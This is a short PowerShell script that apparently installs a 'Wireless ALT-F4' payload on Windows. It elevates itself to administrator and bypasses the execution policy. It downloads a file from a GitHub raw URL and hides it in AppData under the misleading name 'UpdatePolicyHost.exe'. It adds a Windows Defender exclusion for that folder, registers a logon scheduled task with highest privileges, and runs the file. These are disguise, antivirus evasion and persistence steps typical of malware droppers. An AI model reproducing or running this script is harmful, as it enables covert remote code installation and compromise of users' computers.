If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$hidden_path = $env:APPDATA + "\UpdatePolicyHost"
$dummy_name = "UpdatePolicyHost.exe"
$dummy_name_no_exe = "UpdatePolicyHost"
#$cwd_path = Split-Path -Path $PSCommandPath -Parent -Resolve

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerPizza/Wireless-ALT-F4-public/master/payload.txt" -OutFile "$env:USERPROFILE\payload.txt"

if (!(Test-Path "$hidden_path")){
    mkdir "$hidden_path"
}

Add-MpPreference -ExclusionPath "$hidden_path"
Copy-Item "$env:USERPROFILE\payload.txt" -Destination "$hidden_path\$dummy_name"
schtasks /create /tn $dummy_name_no_exe /tr "$hidden_path\$dummy_name" /sc onlogon /rl HIGHEST /f
Remove-Item "$env:USERPROFILE\payload.txt"
.\"$hidden_path\$dummy_name"

pause